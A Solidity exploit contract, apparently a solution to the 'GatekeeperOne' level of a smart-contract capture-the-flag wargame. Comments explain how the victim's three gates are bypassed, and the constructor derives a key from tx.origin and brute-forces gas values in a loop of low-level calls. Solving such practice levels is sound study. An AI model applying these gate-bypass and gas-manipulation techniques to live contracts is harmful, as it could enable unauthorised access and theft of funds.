
pragma solidity ^0.4.18;

contract attackGateKeeperOne {


//the victim's gates are exploitable:
    //gate1 = requires that the victim is called from a contract, tx.origin = EOA; While msg.sender can be EOA or contract Address
    //gate2 = requires that the gas sent is divisible by 8191 (ie 8191 * 5||4||10) + enough gas to reach this gate
    //gate3 requires that gatekey overflows uin16 and uint32 by uint16(tx.orgin) address
   
  constructor(address GatekeeperOneContractAddress) public {
    bytes8 key = bytes8(uint64(uint16(tx.origin)) + 2 ** 32);
    
    // NOTE: the proper gas offset to use will vary depending on the compiler
    // version and optimization settings used to deploy the factory contract.
    // To migitage, brute-force a range of possible values of gas to forward.
    // Using call (vs. an abstract interface) prevents reverts from propagating.
    bytes memory payload = abi.encodeWithSignature(
      bytes4(sha3("enter(bytes8)")),
      key
    );

    // gas offset usually comes in around 210, give a buffer of 60 on each side
   // ![more on determining gas prices](https://www.luno.com/blog/en/post/understanding-ethereum-fees-how-gas-works) 

    for (uint256 i = 0; i < 120; i++) {
      if (
        address(GatekeeperOneContractAddress).call.gas(
          i + 150 + 8191 * 3
        )(
          payload
        )
      ) {
        break;
      }
    }
  }
}

